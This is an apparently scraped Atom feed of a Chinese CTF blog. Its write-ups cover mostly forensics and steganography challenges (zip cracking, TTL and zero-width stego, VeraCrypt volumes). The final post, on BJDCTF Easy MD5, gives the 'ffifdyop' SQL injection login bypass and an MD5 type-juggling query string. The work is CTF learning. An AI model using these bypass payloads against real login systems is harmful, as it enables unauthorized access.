<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Ro1ing.github.io</id>
    <title>Ro1ing</title>
    <updated>2021-05-30T12:30:27.978Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://Ro1ing.github.io"/>
    <link rel="self" href="https://Ro1ing.github.io/atom.xml"/>
    <subtitle>To be patient.</subtitle>
    <logo>https://Ro1ing.github.io/images/avatar.png</logo>
    <icon>https://Ro1ing.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Ro1ing</rights>
    <entry>
        <title type="html"><![CDATA[BUUCTF Misc题]]></title>
        <id>https://Ro1ing.github.io/post/buuctf-misc-/</id>
        <link href="https://Ro1ing.github.io/post/buuctf-misc-/">
        </link>
        <updated>2021-05-30T11:19:25.000Z</updated>
        <content type="html"><![CDATA[<p>大部分都是没有思路看wp得到，部分忘记收集源地址了，该题解方便自己回顾。</p>
<h2 id="swpu2019伟大的侦探">[SWPU2019]伟大的侦探</h2>
<p>#图像密码#<br>
<img src="https://Ro1ing.github.io/post-images/1622374148763.png" alt="" loading="lazy"></p>
<h2 id="actf新生赛2020outguess">[ACTF新生赛2020]outguess</h2>
<figure data-type="image" tabindex="1"><img src="https://Ro1ing.github.io/post-images/1622374258407.png" alt="" loading="lazy"></figure>
<h2 id="安洵杯-2019吹着贝斯扫二维码">[安洵杯 2019]吹着贝斯扫二维码</h2>
<p>flag.zip中<br>
有注释<br>
GNATOMJVIQZUKNJXGRCTGNRTGI3EMNZTGNBTKRJWGI2UIMRRGNBDEQZWGI3DKMSFGNCDMRJTII3TMNBQGM4TERRTGEZTOMRXGQYDGOBWGI2DCNBY<br>
把这些其他文件后缀批量改为jpg发现是二维码<br>
拼出来<br>
BASE Family Bucket ??? 85-&gt;64-&gt;85-&gt;13-&gt;16-&gt;32<br>
所以按照base32-&gt;base16-&gt;rot13-&gt;base85-&gt;base64-&gt;base85的顺序解密得到密码：<br>
看wp才知道是 rot13解密<br>
<a href="https://rot13.com/">https://rot13.com/</a></p>
<h2 id="gxyctf2019gakki">[GXYCTF2019]gakki</h2>
<p>binwalk 分离一个压缩包出来<br>
有密码 数字爆破 8864<br>
里面都是一些字符串数字<br>
字频分析</p>
<pre><code class="language-python"># gakki_exp.py
# Author : imagin
alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- ={}[]&quot;
f = open(&quot;flag.txt&quot;, &quot;r&quot;)
data = f.read()
result = {d:0 for d in alphabet}

def sort_by_value(d):
    items = d.items()
    backitems = [[v[1],v[0]] for v in items]
    backitems.sort(reverse=True)
    return [ backitems[i][1] for i in range(0,len(backitems))]

for d in data:
    for alpha in alphabet:
        if d == alpha:
            result[alpha] = result[alpha] + 1

print(sort_by_value(result))
</code></pre>
<h2 id="bjdctf-2ndtargz-y1ng">[BJDCTF 2nd]TARGZ-y1ng</h2>
<p>压缩包套娃<br>
脚本</p>
<pre><code class="language-python">import zipfile,os
def unzip(zipname):
    while True:
        passwd = zipname.split('.')[0]
        zf = zipfile.ZipFile(zipname,'r')
        zf.extractall(pwd=passwd.encode())
        os.remove(zipname)
        zipname = zf.namelist()[0]
        zf.close()
unzip(&quot;OKMIlLVft.tar.gz&quot;)
</code></pre>
<h2 id="actf新生赛2020ntfs数据流">[ACTF新生赛2020]NTFS数据流</h2>
<p>flag.zip里面都是一堆txt<br>
ntfs 数据流<br>
<img src="https://Ro1ing.github.io/post-images/1622374310430.png" alt="" loading="lazy"><br>
导出ACTF{AAAds_nntfs_ffunn?}</p>
<h2 id="我吃三明治">我吃三明治</h2>
<p>一张图片<br>
foremost 解出两张图片<br>
看wp说是 两张图片连接处 有类似与base32的</p>
<h2 id="swpu2019network">[SWPU2019]Network</h2>
<p>很多数字，只有四种类型<br>
63/127/191/255 将其各自转换为二进制</p>
<pre><code>00111111
01111111
10111111
11111111
</code></pre>
<p>只有前两位是变化的。这就是TTL隐写。<br>
写个脚本。取出前两位。重新组合。再以8位一组。转换为16进制字符。再将16进制字符转换为字符<br>
ttl解密脚本</p>
<pre><code>import binascii
f=open('1.txt','r')
s=''
for i in f.readlines():
    if i == &quot;63\r\n&quot;:
        a='00'
    if i == &quot;127\r\n&quot;:
        a='01'
    if i == &quot;191\r\n&quot;:
        a='10'
    if i == &quot;255\r\n&quot;:
        a='11'
    s+=a
data=''
for i in range(0,len(s),8):
    data+=chr(int(s[i:i+8],2))
data=binascii.unhexlify(data)
print(data)
</code></pre>
<p>得到一个压缩包，ZIP伪加密。修改得到一大串Base64</p>
<pre><code>import base64
f=open('flag.txt','r')
data=f.readlines()[0]
while True:
    data=base64.b64decode(data)
    if '{' in data:
        print data
        exit(0)
</code></pre>
<h2 id="安洵杯2019easy-misc">[安洵杯2019]easy misc</h2>
<p>参考：https://www.pythonheidong.com/blog/article/480228/53eba1f0463f049938d8/<br>
https://xz.aliyun.com/t/6911#toc-30<br>
decode.zip里面有</p>
<blockquote>
<p>FLAG IN ((√2524921X85÷5+2)÷15-1794)+NNULLULL,<br>
一个算术加NNULLULL,猜测可能考察掩码攻击<br>
前面的算术算出来是7，即也就是7+NNULLULL,<br>
<img src="https://Ro1ing.github.io/post-images/1622374519015.png" alt="" loading="lazy"><br>
学到了<br>
2019456NNULLULL<br>
foremost分离出两个一样的图片<br>
盲水印：<br>
<img src="https://Ro1ing.github.io/post-images/1622374631852.png" alt="" loading="lazy"><br>
提取出来 提示看 11.txt<br>
说明字频隐写在11.txt中，hint中提示取前16位即etaonrhsidluygw<br>
read文件夹内都是看不懂的东西</p>
</blockquote>
<pre><code>decode.txt
a = dIW
b = sSD
c = adE 
d = jVf
e = QW8
f = SA=
g = jBt
h = 5RE
i = tRQ
j = SPA
k = 8DS
l = XiE
m = S8S
n = MkF
o = T9p
p = PS5
q = E/S
r = -sd
s = SQW
t = obW
u = /WS
v = SD9
w = cw=
x = ASD
y = FTa
z = AE7
</code></pre>
<p>利用python脚本获取11.txt中前16高频字母<br>
字频分析脚本</p>
<pre><code>import re
file = open('C:/Users/Fiona/Desktop/11.txt')
line = file.readlines()
file.seek(0,0)
file.close()

result = {}
for i in range(97,123):
	count = 0
	for j in line:
		find_line = re.findall(chr(i),j)
		count += len(find_line)
	result[chr(i)] = count
res = sorted(result.items(),key=lambda item:item[1],reverse=True)
num = 1
for x in res:
	print('频数第{0}: '.format(num),x)
	num += 1 
</code></pre>
<p><img src="https://Ro1ing.github.io/post-images/1622374745952.png" alt="" loading="lazy"><br>
etaonrhsidluygw 替换 得到 QW8obWdIWT9pMkFSQWtRQjVfXiE/WSFTajBtcw==<br>
base64</p>
<blockquote>
<p>Ao(mgHY?i2ARAkQB5_^!?Y!Sj0ms<br>
base85<br>
flag{have_a_good_day1}</p>
</blockquote>
<h2 id="rctf2019draw">[RCTF2019]draw</h2>
<pre><code>cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home
</code></pre>
<p>https://www.calormen.com/jslogo/ 解释器</p>
<h2 id="sctf2019电单车">[SCTF2019]电单车</h2>
<p>http://www.kb-iot.com/post/756.html</p>
<p><img src="https://Ro1ing.github.io/post-images/1622374780277.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622374783974.png" alt="" loading="lazy"><br>
长波为1，短波为0<br>
0111010010101010011000100<br>
看wp取前20位</p>
<h2 id="弱口令">弱口令</h2>
<p>放进sublime 查看<br>
<img src="https://Ro1ing.github.io/post-images/1622376703868.png" alt="" loading="lazy"><br>
换成摩斯<br>
.... .<br>
.-.. .-.. ----- ..-. --- .-. ..- --<br>
HELL0FORUM<br>
获得图片<br>
看wp才知道是 <strong>lsp隐写</strong><br>
<img src="https://Ro1ing.github.io/post-images/1622376719287.png" alt="" loading="lazy"><br>
根据提示弱口令进行猜测，当口令为123456可以分离出内容</p>
<figure data-type="image" tabindex="2"><img src="https://Ro1ing.github.io/post-images/1622376764716.png" alt="" loading="lazy"></figure>
<h2 id="guet-ctf2019zips">[GUET-CTF2019]zips</h2>
<p>文件头损害 伪加密 setup.sh<br>
<img src="https://Ro1ing.github.io/post-images/1622376785775.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622376793234.png" alt="" loading="lazy"><br>
掩码攻击<br>
flag.zip为掩码爆破，因为时间戳和出题当时不太一样所以往前推，<br>
利用ARCHPR设置掩码15???.?? 掩码符号为**?**<br>
<img src="https://Ro1ing.github.io/post-images/1622376836967.png" alt="" loading="lazy"></p>
<h2 id="wustctf2020girlfriend">[WUSTCTF2020]girlfriend</h2>
<p>#音频隐写#</p>
<p>打电话输入号码的声音，猜测DTMF拨号音识别，有个程序可以识别一下dtmf2num.exe<br>
<img src="https://Ro1ing.github.io/post-images/1622376886150.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622376850550.png" alt="" loading="lazy"></p>
<h2 id="actf新生赛2020明文攻击">[ACTF新生赛2020]明文攻击</h2>
<p>提示明文攻击 res.zip加密 还有一张图片 16进制下看见有东西 分离出来</p>
<figure data-type="image" tabindex="3"><img src="https://Ro1ing.github.io/post-images/1622376913897.png" alt="" loading="lazy"></figure>
<p>发现 里面的flag.txt大小和 加密的一样 提取出来得到flag</p>
<h2 id="suctf2018single-dog">[SUCTF2018]single dog</h2>
<p>16进制下 发现压缩包 文件分离</p>
<p>解压出来 颜文字 解密 （jsfuck？）</p>
<pre><code>function a(){vara=&quot;SUCTF{happy double eleven}&quot;;alert(&quot;双十一快乐&quot;);}a();
</code></pre>
<h2 id="suctf2018followme">[SUCTF2018]followme</h2>
<figure data-type="image" tabindex="4"><img src="https://Ro1ing.github.io/post-images/1622376932827.png" alt="" loading="lazy"></figure>
<p>看了wp 原来是爆破admin 密码</p>
<p>一个个访问出来的文件看看</p>
<figure data-type="image" tabindex="5"><img src="https://Ro1ing.github.io/post-images/1622376948758.png" alt="" loading="lazy"></figure>
<h2 id="mrctf2020千层套路">[MRCTF2020]千层套路</h2>
<p>压缩包名字就是密码</p>
<pre><code>import zipfilename=&quot;0573&quot;while True:    fz = zipfile.ZipFile(name + &quot;.zip&quot; , &quot;r&quot;)    fz.extractall(pwd=bytes(name,'utf-8'))    name = fz.filelist[0].filename[0:4]    fz.close()Q
</code></pre>
<p>开始以为是 流量分析</p>
<p>才知道是RGB数据 学到了</p>
<p>看wp 整理 使用密码机器将 （）去掉</p>
<pre><code>from PIL import Imagex = y = 200img = Image.new(&quot;RGB&quot;,(x,y))file = open('./new qr.txt','r')for width in range(0,x):    for height in range(0,y):        line = file.readline()        rgb = line.split(',')        img.putpixel((width,height),(int(rgb[0]),int(rgb[1]),int(rgb[2])))
</code></pre>
<p><img src="https://Ro1ing.github.io/post-images/1622377004355.png" alt="" loading="lazy"><br>
将RGB数据写成图片</p>
<pre><code>from PIL import Imagex = y = 200img = Image.new(&quot;RGB&quot;,(x,y))file = open('./qr.txt','r')for width in range(0,x):    for height in range(0,y):        line = file.readline()        rgb = line.split(',')        img.putpixel((width,height),(int(rgb[0]),int(rgb[1]),int(rgb[2])))img.save('flag.jpg')
</code></pre>
<p>一个二维码</p>
<h2 id="ctf2019otaku">[*CTF2019]otaku</h2>
<p>https://0xwindsky.github.io/2020/07/28/buumisc4/<br>
原题hint:The txt is GBK encoding.<br>
看题解 是 word里面有隐藏文字<br>
lastword 进行明文攻击，注意word里隐藏文字不能直接复制，选中那段话右键字体里把隐藏前面的钩去掉后就可以复制<br>
<img src="https://Ro1ing.github.io/post-images/1622377067769.png" alt="" loading="lazy"></p>
<p>网上使用python 将 其转化为GBK模式<br>
我使用notepad<br>
<a href="https://www.php.cn/tool/notepad/427915.html">https://www.php.cn/tool/notepad/427915.html</a></p>
<p><img src="https://Ro1ing.github.io/post-images/1622377121115.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622377134723.png" alt="" loading="lazy"><br>
lsb隐写<br>
<img src="https://Ro1ing.github.io/post-images/1622377333612.png" alt="" loading="lazy"></p>
<h2 id="actf新生赛2020music">[ACTF新生赛2020]music</h2>
<p>https://blog.csdn.net/mochu7777777/article/details/109806994</p>
<p>文件异常，并且出现多次字符A1<br>
<img src="https://Ro1ing.github.io/post-images/1622377366071.png" alt="" loading="lazy"></p>
<p>猜测对整个原文件进行了异或，使用010<br>
Editor在工具-&gt;十六进制运算-&gt;二进制异或对整个文件内容进行异或</p>
<figure data-type="image" tabindex="6"><img src="https://Ro1ing.github.io/post-images/1622377376700.png" alt="" loading="lazy"></figure>
<p>保存得到正常音频文件，听内容得到：actfabcdfghijk</p>
<h2 id="mrctf2020hello_-misc">[MRCTF2020]Hello_ misc</h2>
<p>WP<br>
<img src="https://Ro1ing.github.io/post-images/1622377399523.png" alt="" loading="lazy"></p>
<p>red通道保存下来<br>
<img src="https://Ro1ing.github.io/post-images/1622377419706.png" alt="" loading="lazy"><br>
separate<br>
!@#$%67*()-+<br>
不对啊<br>
原来是原来的图片文件分离出来<br>
out.txt<br>
转为二进制发现只有八位二进制的前两位不同<br>
<img src="https://Ro1ing.github.io/post-images/1622377439747.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622377444885.png" alt="" loading="lazy"><br>
白色字体改色<br>
<img src="https://Ro1ing.github.io/post-images/1622377462025.png" alt="" loading="lazy"><br>
base64解码每行<br>
110110111111110011110111111111111111111111111111101110000001111111111001101<br>
110110110001101011110111111111111111111111111111111101111111111111110110011<br>
110000101110111011110111111100011111111111001001101110000011111000011111111<br>
110110100001111011110111111011101111111110110110101111111100110111111111111<br>
110110101111111011110111101011101111111110110110101101111100110111111111111<br>
110110100001100000110000001100011100000110110110101110000001111000011111111</p>
<figure data-type="image" tabindex="7"><img src="https://Ro1ing.github.io/post-images/1622377479290.png" alt="" loading="lazy"></figure>
<p>替换He1Lo_mi5c~</p>
<h2 id="actf新生赛2020剑龙">[ACTF新生赛2020]剑龙</h2>
<p><img src="https://Ro1ing.github.io/post-images/1622377493870.png" alt="" loading="lazy"><br>
steghide<br>
<img src="https://Ro1ing.github.io/post-images/1622377505282.png" alt="" loading="lazy"><br>
看到一个没后缀的文件，直接打不开，linux下file一下，知道是pyc文件，<br>
重命名o_o.pyc<br>
因为stegosaurus只识别py、pyc、pyo 文件<br>
<img src="https://Ro1ing.github.io/post-images/1622377519563.png" alt="" loading="lazy"></p>
<h2 id="mrctf2020unravel">[MRCTF2020]Unravel!!</h2>
<p>压缩包有密码<br>
图片进行文件分离<br>
图片- Tokyo<br>
视频提示看文件最后 AES加密/解密<br>
<img src="https://Ro1ing.github.io/post-images/1622377546073.png" alt="" loading="lazy"><br>
得到压缩包里的wav<br>
用SilentEye解密wav得flag<br>
<img src="https://Ro1ing.github.io/post-images/1622377560530.png" alt="" loading="lazy"></p>
<h2 id="gkctf2020harley-quinn">[GKCTF2020]Harley Quinn</h2>
<blockquote>
<p>Hint1:<br>
HQ 电话音&amp;九宫格<br>
Hint2：<br>
FreeFileCamouflage，下载的文件可能显示乱码<br>
<img src="https://Ro1ing.github.io/post-images/1622377581117.png" alt="" loading="lazy"><br>
剪一下<br>
<img src="https://Ro1ing.github.io/post-images/1622377593768.png" alt="" loading="lazy"><br>
222 C<br>
8 T<br>
33 E<br>
444 I<br>
7777 S<br>
33 E<br>
88 U<br>
66 N<br>
CTEISEUN<br>
？？看了看题解为啥我的解密有问题<br>
<img src="https://Ro1ing.github.io/post-images/1622377609233.png" alt="" loading="lazy"><br>
这下可以了 可能是分离的时候有点问题<br>
ctfisfun<br>
<img src="https://Ro1ing.github.io/post-images/1622377655244.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622377643999.png" alt="" loading="lazy"></p>
</blockquote>
<h2 id="utctf2020zero">[UTCTF2020]zero</h2>
<p>零字符隐写</p>
<blockquote>
<p>Lorem ipsum dolor ‌‌‌‌‍﻿‍‍sit amet‌‌‌‌‍﻿‍‌, consectetur adipiscing‌‌‌‌‍‬‍‬ elit.‌‌‌‌‍‬﻿‌‌‌‌‌‍‬‌‍ Phasellus quis tempus ante, nec vehicula mi. ‌‌‌‌‍‬‍﻿Aliquam nec‌‌‌‌‍﻿‬﻿ nisi ut neque interdum auctor.‌‌‌‌‍﻿‍﻿ Aliquam felis ‌‌‌‌‍‬‬‌orci, vestibulum ‌‌‌‌‍﻿‬‍sit amet ante‌‌‌‌‍‌﻿‬ at, consectetur‌‌‌‌‍‌﻿﻿ lobortis eros.‌‌‌‌‍‍‍‌ ‌‌‌‌‍‌‌‌Orci varius natoque ‌‌‌‌‍﻿‌﻿penatibus et ‌‌‌‌‍‬‌﻿magnis‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‍ dis ‌‌‌‌‍‍﻿﻿parturient montes, nascetur ridiculus ‌‌‌‌‌﻿‍‌‌‌‌‌‌﻿‬‍mus. In finibus‌‌‌‌‌﻿‌‬ magna‌‌‌‌‌﻿‍﻿ mauris, quis‌‌‌‌‍‬‌‍ auctor ‌‌‌‌‍‬‌‍libero congue quis. ‌‌‌‌‍‬‬‬Duis‌‌‌‌‍‬‌‬ sagittis consequat urna non tristique. Pellentesque eu lorem ‌‌‌‌‍﻿‌‍id‌‌‌‌‍‬‬﻿ quam vestibulum ultricies vel ac purus‌‌‌‌‌﻿‌‍.‌</p>
</blockquote>
<p>https://www.btis.site/2020/05/21/UTCTF-misc%E5%90%88%E9%9B%86<br>
考点：零宽度字符隐写<br>
打开txt，发现显示列数远多于字母数，拿vim打开，发现许多&lt;200b&gt;之类文字，于是想到<br>
零宽度字符<br>
解密网站：<br>
http://330k.github.io/misc_tools/unicode_steganography.html</p>
<h2 id="rctf2019disk">[RCTF2019]disk</h2>
<p>wp：<br>
用7z先解压出0.fat<br>
说明外层的 vmdk 只是容器，并没有加密。将 0.fat 解压出来，再次尝试用 7zip 打开，报错，说明 vmdk 中包含的这个 FAT32 分区被加密了。使用 WinHex 载入这个文件可以看到：<br>
<img src="https://Ro1ing.github.io/post-images/1622377687564.png" alt="" loading="lazy"><br>
rctf{unseCure_quick_form4t_vo1ume<br>
题目中给了<br>
VeraCrypt<br>
密码<br>
对 0.fat<br>
文件进行解密并加载，发现加载成功，为常规卷，加密类型为 AES。<br>
题目设定如下：<br>
An otaku used VeraCrypt to encrypt his favorites.<br>
Password: rctf<br>
Flag format: rctf{a-zA-Z0-9_}<br>
<img src="https://Ro1ing.github.io/post-images/1622377717950.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622377731663.png" alt="" loading="lazy"><br>
将此加密盘卸载，使用得到的第二个密码再次加载，加载成功。加密方式是<br>
AES，但是注意该分区是隐藏分区。<br>
<img src="https://Ro1ing.github.io/post-images/1622377741448.png" alt="" loading="lazy"><br>
由于是隐藏分区所以无法直接访问。因此使用<br>
WinHex 载入磁盘，提示无法自动检测分区格式后选择“分区无格式”，并查看该分区扇区数据（DiskGenius 查看磁盘扇区数据也可以）<br>
<img src="https://Ro1ing.github.io/post-images/1622377749638.png" alt="" loading="lazy"><br>
打不开<br>
<img src="https://Ro1ing.github.io/post-images/1622377768010.png" alt="" loading="lazy"><br>
之前一直打不开 原来是winhex要用管理员权限打开</p>
<p>_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupted_1nner_v0lume}_and_corrupte</p>
<p>flag{unseCure_quick_form4t_vo1ume_and_corrupted_1nner_v0lume}</p>
<h2 id="npuctf2020签到">[NPUCTF2020]签到</h2>
<p>mc我的世界 必须要用1.15.2版本<br>
不同版本红石不同<br>
红石控制开关<br>
常量为1 短亮为0<br>
00111001 01100001 00111001<br>
通过二进制串按照8位<br>
ASCII 9a9<br>
Md5 32位加密</p>
<h2 id="npuctf2020碰上彩虹吃定彩虹">[NPUCTF2020]碰上彩虹，吃定彩虹！</h2>
<p>txt中发现<br>
<img src="https://Ro1ing.github.io/post-images/1622377787590.png" alt="" loading="lazy"><br>
凯撒密码解密<br>
autokey<br>
autokey<br>
加密？<br>
vim查看另外一个<br>
<img src="https://Ro1ing.github.io/post-images/1622377798141.png" alt="" loading="lazy"><br>
零宽度字符隐写<br>
<a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a><br>
解密<br>
看wp原来还要这样<br>
<img src="https://Ro1ing.github.io/post-images/1622377815192.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622377820172.png" alt="" loading="lazy"><br>
还说要用NTFS<br>
我靠 我什么都没扫出来 原来是360解压直接把NTFS解密出来了</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[INSHack2019]gflag]]></title>
        <id>https://Ro1ing.github.io/post/inshack2019gflag/</id>
        <link href="https://Ro1ing.github.io/post/inshack2019gflag/">
        </link>
        <updated>2021-03-16T07:30:38.000Z</updated>
        <content type="html"><![CDATA[<p><strong>My brother likes esoteric programming. He sent me this file but I don't see what it is for. Could you help me ?</strong><br>
我哥哥喜欢深奥的程序设计。他给我发了这份文件，但我不知道是做什么用的。你能帮我个忙吗?<br>
<a href="https://static.ctf.insecurity-insa.fr/a7572eb34ba9700b39f1ba7f5869bf301b67d406.tar.gz">GFlag files</a><br>
<img src="https://Ro1ing.github.io/post-images/1615880103330.png" alt="" loading="lazy"><br>
查到WP<br>
https://cosmikflaghunters.wordpress.com/2019/05/05/inshack-2019-gflag/<br>
G1 lines look like axis positioning, so we started to search printing coding and we found GCODE.<br>
As we don’t have a 3D printer, we have to simulate the printing online, we foud the website <a href="http://gcode.ws/">http://gcode.ws</a><br>
Add .gcode at the end of the file and upload it to the website:<br>
<img src="https://Ro1ing.github.io/post-images/1615880184407.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1615880187535.png" alt="" loading="lazy"><br>
NSA{3d_pr1nt3d_fl49}</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[HDCTF2019]信号分析]]></title>
        <id>https://Ro1ing.github.io/post/hdctf2019xin-hao-fen-xi/</id>
        <link href="https://Ro1ing.github.io/post/hdctf2019xin-hao-fen-xi/">
        </link>
        <updated>2021-03-15T13:01:42.000Z</updated>
        <content type="html"><![CDATA[<p>2秒的音频没有声音</p>
<figure data-type="image" tabindex="1"><img src="https://Ro1ing.github.io/post-images/1615879711654.png" alt="" loading="lazy"></figure>
<p>波形切换到波形（db）就有图像了<br>
单个波形是有规律的<br>
提示：Hackcube</p>
<p><a href="https://www.freebuf.com/author/mobier">使用HackCube-Special分析固定码信号</a></p>
<h3 id="信号脉冲">信号脉冲</h3>
<figure data-type="image" tabindex="2"><img src="https://Ro1ing.github.io/post-images/1615879749906.png" alt="" loading="lazy"></figure>
<h3 id="固定码遥控信号的构成">固定码遥控信号的构成</h3>
<p><img src="https://Ro1ing.github.io/post-images/1615879755476.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1615879759978.png" alt="" loading="lazy"><br>
FFFFFFFF 0001 停止码</p>
<p>看wp要得到FFFFFFFF0001然后{}包起来</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ALCTF]Misc]]></title>
        <id>https://Ro1ing.github.io/post/alctfmisc/</id>
        <link href="https://Ro1ing.github.io/post/alctfmisc/">
        </link>
        <updated>2021-01-30T06:46:30.000Z</updated>
        <content type="html"><![CDATA[<p>校内CTF平台 题目</p>
<h2 id="只会影响我拔剑的速度">只会影响我拔剑的速度</h2>
<p>gif逐帧播放</p>
<h2 id="听我娓娓道来">听我娓娓道来</h2>
<p>属性-详细信息-备注 or 16进制</p>
<p>与佛论禅解密网站：http://www.keyfc.net/bbs/tools/tudoucode.aspx</p>
<h2 id="电线鲨鱼">电线鲨鱼</h2>
<p>wireshark打开流量包</p>
<p><img src="1.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989239604.png" alt="" loading="lazy"><br>
or 偷鸡 16进制</p>
<p><img src="2.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989243485.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ASIS 2019]Unicorn shop]]></title>
        <id>https://Ro1ing.github.io/post/asis-2019unicorn-shop/</id>
        <link href="https://Ro1ing.github.io/post/asis-2019unicorn-shop/">
        </link>
        <updated>2021-01-30T06:45:22.000Z</updated>
        <content type="html"><![CDATA[<p><img src="image-20200519215130151.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989154422.png" alt="" loading="lazy"><br>
发现这里无论输入任何ID和Price都无法购买</p>
<p>当Price 小于10 时 显示Wrong commodity</p>
<p>当Price 大于10 时 显示Only one char（？） allowed！</p>
<p><img src="image-20200519215322998.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989157234.png" alt="" loading="lazy"><br>
utf8?</p>
<p>https://xz.aliyun.com/t/5402#toc-0</p>
<blockquote>
<h3 id="23-数字显示">2.3 数字显示</h3>
<p>一些国家的数字在显示的时候也可能造成问题，例如孟加拉语的0-9是০ ১ ২ ৩ ৪ ৫ ৬ ৭ ৮ ৯，但是这里的৪ (U+09EA) 实际上是数字4。ASIS CTF 2019 的 <a href="https://xz.aliyun.com/t/(https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis)">Unicorn Shop</a> 也是从Unicode背后的数字角度出发考虑问题。</p>
</blockquote>
<p>在这个网站查找Unicode</p>
<p>https://www.compart.com/en/unicode</p>
<p><img src="image-20200519215746992.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989163598.png" alt="" loading="lazy"><br>
点开找到大于1337的字符即可</p>
<p>参考链接：</p>
<p>https://www.cnblogs.com/Cl0ud/p/12221360.html</p>
<p>https://shawroot.hatenablog.com/entry/2019/10/29/ASIS_2019-Unicorn_shop</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[BJDCTF 2nd]EasyBaBa]]></title>
        <id>https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/</id>
        <link href="https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/">
        </link>
        <updated>2021-01-30T06:44:31.000Z</updated>
        <content type="html"><![CDATA[<p>感觉 有东西压缩在里面 foremost分离</p>
<p>解压出一个 里面都是出题人.jpg</p>
<p>16进制查看是 视频格式 扫码得到 一点都不Easy😅</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[BJDCTF2020]Easy MD5]]></title>
        <id>https://Ro1ing.github.io/post/bjdctf2020easy-md5/</id>
        <link href="https://Ro1ing.github.io/post/bjdctf2020easy-md5/">
        </link>
        <updated>2021-01-30T06:43:16.000Z</updated>
        <content type="html"><![CDATA[<p>抓包发现 Hint</p>
<blockquote>
<p>select * from 'admin' where password=md5($pass,true)</p>
</blockquote>
<p>直接提交 <strong>ffifdyop</strong></p>
<p><strong>md5()函数</strong>有两个参数</p>
<p><strong>参数一</strong>是要加密的字符串；</p>
<p><strong>参数二</strong>是输出格式：为true时，表示输出原始16字符二进制格式；默认为false，表示输出32字符十六进制数。</p>
<p>所以要通过注入</p>
<p>如何闭合sql语句？找到一个字符串MD5加密后得到的原始二进制格式在SQL中拼接 成 ‘ or’ 的形式绕过</p>
<p>ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c</p>
<p>而这个字符串的前几位是 ‘or' 6</p>
<p>Mysql 刚好又会吧 hex 转成 ascii 解释，</p>
<p>因此拼接之后的形式是</p>
<blockquote>
<p>1select * from 'admin' where password='' or '6xxxxx'</p>
</blockquote>
<p><img src="image-20200519221047710.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989034103.png" alt="" loading="lazy"><br>
查看源代码</p>
<p><img src="image-20200519221054813.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1611989037550.png" alt="" loading="lazy"><br>
?a=s155964671a&amp;b=s1091221200a</p>
<p>md5碰撞：<strong>md5码不同但是表示的数字可能相同</strong>，故有md5碰撞导致可能会有安全问题</p>
<p><img src="image-20200519221132965.png" alt="" loading="lazy"><br>
